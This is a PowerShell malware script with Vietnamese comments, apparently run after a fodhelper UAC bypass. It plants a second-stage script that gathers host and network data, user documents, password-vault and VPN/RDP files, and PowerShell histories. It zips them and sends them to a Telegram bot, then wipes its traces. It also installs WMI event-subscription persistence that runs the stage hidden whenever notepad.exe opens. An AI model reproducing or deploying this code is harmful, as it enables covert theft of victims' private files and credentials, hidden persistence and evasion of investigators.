# payload.ps1 — Admin context (chay tu fodhelper UAC bypass)
$wmiDst = "C:\Windows\Temp\svhw.ps1"
$svhwContent = @'
# svhw.ps1 - WMI Consumer payload (SYSTEM context)
# Su dung curl.exe de gui file (tuong thich PowerShell 5.1)
$botToken = "<YOUR_TELEGRAM_BOT_TOKEN>"
$chatId   = "<YOUR_TELEGRAM_CHAT_ID>"
$wd = "C:\Windows\Temp\wdmp"
$zp = "C:\Windows\Temp\wdmp.zip"
$maxTotalMB = 48
$maxFileSize = 1.5 * 1024 * 1024

if (Test-Path $wd) { Remove-Item $wd -Recurse -Force -ErrorAction SilentlyContinue }
New-Item -ItemType Directory -Path $wd -Force | Out-Null

# 1. System & Network Discovery
try {
    $os = Get-WmiObject Win32_OperatingSystem
    $ip = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
           Where-Object { $_.InterfaceAlias -notlike "*Loopback*" } |
           Select-Object -First 3).IPAddress -join ", "
    $ul = (Get-LocalUser | Select-Object Name, Enabled | Format-Table -Auto | Out-String).Trim()
    $ar = (arp -a) -join "`n"
    $info = @"
HOST: $($env:COMPUTERNAME)
USER: $($env:USERDOMAIN)\$($env:USERNAME)
OS: $($os.Caption) $($os.BuildNumber)
IP: $ip
TIME: $(Get-Date -f 'yyyy-MM-dd HH:mm:ss')

USERS:
$ul

ARP:
$ar
"@
    $info | Out-File "$wd\info.txt" -Encoding UTF8 -Force
} catch {}

# 2. Thu thap file
try {
    $folders = @(
        "C:\Users\*\Desktop", "C:\Users\*\Documents", "C:\Users\*\Downloads",
        "C:\Users\*\Pictures", "C:\Users\*\Music", "C:\Users\*\Videos",
        "C:\Users\*\Favorites", "C:\Users\*\Contacts", "C:\Users\*\Saved Games",
        "C:\Users\*\Searches", "C:\Users\*\Links", "C:\Users\*\OneDrive"
    )
    $allowedExt = '\.(txt|csv|docx|xlsx|pdf|kdbx|ovpn|rdp|log|cfg|ini|conf|ps1|bat|cmd|vbs|js|html|xml|json|sql|db|sqlite|bak|old|swp|tmp|rpt|doc|xls|ppt|pptx|mdb|accdb|lnk|url|msg|eml|one|vsdx|pub|odt|ods|odp|rtf|wps|pages|numbers|key|ppsx|xlsm)$'
    
    foreach ($folder in $folders) {
        $resolved = Resolve-Path $folder -ErrorAction SilentlyContinue
        foreach ($res in $resolved) {
            Get-ChildItem -Path $res -File -Recurse -ErrorAction SilentlyContinue | 
                Where-Object { $_.Length -le $maxFileSize -and $_.Extension -match $allowedExt } |
                ForEach-Object {
                    $destName = $_.Name
                    $counter = 1
                    while (Test-Path "$wd\$destName") {
                        $base = [System.IO.Path]::GetFileNameWithoutExtension($_.Name)
                        $destName = "$base`_$counter$($_.Extension)"
                        $counter++
                    }
                    Copy-Item $_.FullName "$wd\$destName" -Force -ErrorAction SilentlyContinue
                }
        }
    }
} catch {}

# 3. PowerShell history
try {
    $users = Get-ChildItem "C:\Users" -Directory -ErrorAction SilentlyContinue
    foreach ($user in $users) {
        $hist = "$($user.FullName)\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
        if (Test-Path $hist) {
            Copy-Item $hist "$wd\ps_history_$($user.Name).txt" -Force -ErrorAction SilentlyContinue
        }
    }
} catch {}

# 4. Kiem tra tong dung luong
$totalSize = (Get-ChildItem $wd -File -Recurse -ErrorAction SilentlyContinue | Measure-Object -Property Length -Sum).Sum
$totalSizeMB = [math]::Round($totalSize / 1MB, 2)
if ($totalSizeMB -gt $maxTotalMB) {
    $errMsg = "[ERROR] Total data size ($totalSizeMB MB) exceeds limit ($maxTotalMB MB). No file sent."
    $body = @{ chat_id = $chatId; text = $errMsg } | ConvertTo-Json -Compress
    try {
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
    } catch {}
    Remove-Item $wd -Recurse -Force -ErrorAction SilentlyContinue
    exit 1
}

# 5. Manifest
$files = Get-ChildItem $wd -File
"Files: $($files.Count)" | Out-File "$wd\_manifest.txt" -Encoding UTF8
$files | ForEach-Object { "  $($_.Name) [$($_.Length) bytes]" | Out-File "$wd\_manifest.txt" -Encoding UTF8 -Append }

# 6. Nen
try {
    if (Test-Path $zp) { Remove-Item $zp -Force }
    Compress-Archive -Path "$wd\*" -DestinationPath $zp -Force -ErrorAction Stop
} catch {
    $errMsg = "[ERROR] Compression failed: $_"
    $body = @{ chat_id = $chatId; text = $errMsg } | ConvertTo-Json -Compress
    Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
    exit 1
}

# 7. Gui file zip bang curl.exe
$zipInfo = Get-Item $zp
if ($zipInfo.Length -gt 0 -and $zipInfo.Length -le 50 * 1024 * 1024) {
    $caption = "Exfil completed: $($zipInfo.Name) ($([math]::Round($zipInfo.Length/1MB,2)) MB)"
    $curlCmd = "curl.exe -s -F chat_id=$chatId -F document=@`"$zp`" -F caption=`"$caption`" https://api.telegram.org/bot$botToken/sendDocument"
    try {
        $result = Invoke-Expression $curlCmd
        if ($result -match '"ok":false') {
            throw "Telegram API error: $result"
        }
    } catch {
        $errMsg = "[$(Get-Date -f 'yyyy-MM-dd HH:mm:ss')] Send failed: $_`n"
        Add-Content -Path "$wd\_upload_error.txt" -Value $errMsg -Encoding UTF8
        $errText = "[ERROR] Failed to upload zip. Check $wd\_upload_error.txt"
        $body = @{ chat_id = $chatId; text = $errText } | ConvertTo-Json -Compress
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
    }
} else {
    $errMsg = "[ERROR] Zip file size issue: $($zipInfo.Length) bytes"
    $body = @{ chat_id = $chatId; text = $errMsg } | ConvertTo-Json -Compress
    Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
}

# Gui thong bao tom tat
$totalMB = [math]::Round($zipInfo.Length/1MB,2)
$summary = @"
[+] Exfiltration Summary
Host: $env:COMPUTERNAME
User: $env:USERDOMAIN\$env:USERNAME
Files collected: $($files.Count)
Zip size: $totalMB MB
"@
$body = @{ chat_id = $chatId; text = $summary } | ConvertTo-Json -Compress
try {
    Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
} catch {}

# 8. Cleanup
Start-Sleep -Seconds 2
try {
    Start-Process cmd -ArgumentList "/c timeout /t 2 >nul & rd /S /Q `"$wd`" & del /F /Q `"$zp`"" -WindowStyle Hidden
    $h = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
    if (Test-Path $h) { Clear-Content $h -Force -ErrorAction SilentlyContinue }
} catch {}
'@

# Ghi payload svhw.ps1 vào đích
Set-Content -Path $wmiDst -Encoding UTF8 -Value $svhwContent

if (-not (Test-Path $wmiDst)) { exit 1 }

# --- Xóa WMI subscription cũ một cách dứt khoát ---
$FilterName = "NotepadFilter"
$ConsumerName = "SystemDumpConsumer"

Write-Host "[*] Removing old WMI subscriptions..."

# Xóa binding
$bindings = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object { $_.Filter -match $FilterName -or $_.Consumer -match $ConsumerName }
$bindings | ForEach-Object { 
    Write-Host "[-] Removing binding: Filter=$($_.Filter), Consumer=$($_.Consumer)"
    $_ | Remove-WmiObject -ErrorAction SilentlyContinue
}

# Xóa consumer
$consumerOld = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='$ConsumerName'" -ErrorAction SilentlyContinue
if ($consumerOld) {
    Write-Host "[-] Removing consumer: $ConsumerName"
    $consumerOld | Remove-WmiObject -ErrorAction SilentlyContinue
}

# Xóa filter
$filterOld = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$FilterName'" -ErrorAction SilentlyContinue
if ($filterOld) {
    Write-Host "[-] Removing filter: $FilterName"
    $filterOld | Remove-WmiObject -ErrorAction SilentlyContinue
}

# Đợi một chút để WMI repository ổn định
Start-Sleep -Milliseconds 500

Write-Host "[*] Creating new WMI subscriptions..."

# --- Tạo mới Filter ---
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name           = $FilterName
    EventNameSpace = "root\cimv2"
    QueryLanguage  = "WQL"
    Query          = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'notepad.exe'"
} -ErrorAction Stop
Write-Host "[+] EventFilter '$FilterName' created."

# --- Tạo mới Consumer ---
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name                = $ConsumerName
    CommandLineTemplate = "powershell.exe -ep bypass -w hidden -noni -f `"$wmiDst`""
    RunInteractively    = $false
} -ErrorAction Stop
Write-Host "[+] CommandLineEventConsumer '$ConsumerName' created."

# --- Tạo Binding ---
$binding = Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter   = $filter
    Consumer = $consumer
} -ErrorAction Stop
Write-Host "[+] FilterToConsumerBinding created. Persistence active."

Write-Host "[+] WMI persistence installed successfully. Trigger: notepad.exe"